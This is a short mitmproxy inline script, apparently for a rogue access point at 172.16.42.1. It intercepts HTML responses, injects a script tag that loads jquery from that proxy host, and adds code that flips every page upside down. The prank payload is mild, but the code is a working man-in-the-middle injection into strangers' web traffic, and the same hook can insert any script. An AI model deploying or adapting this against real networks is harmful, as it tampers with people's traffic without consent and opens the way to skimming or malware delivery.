import re
import subprocess

def response(ctx, flow):
 try:
  if re.match('text/html',flow.response.headers["content-type"][0]):
   flow.response.decode()
   oldtxt = flow.response.content
   newtxt = oldtxt.replace('<head>','<head><script src="http://172.16.42.1/jquery.min.js"></script>')
   newtxt = newtxt.replace('</body>','<script>$(document).ready(function() { $("body").attr("style","-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-ms-transform:rotate(180deg);-o-transform:rotate(180deg);transform:rotate(180deg);filter:progid:DXImageTransform.Microsoft.Matrix(M11=-1, M12=-1.2246063538223773e-16, M21=1.2246063538223773e-16, M22=-1, sizingMethod=\'auto expand\');zoom:1;")});</script></body>')
   flow.response.content=str(newtxt)
	
 except IndexError:
  ctx.log("no content-type[0]")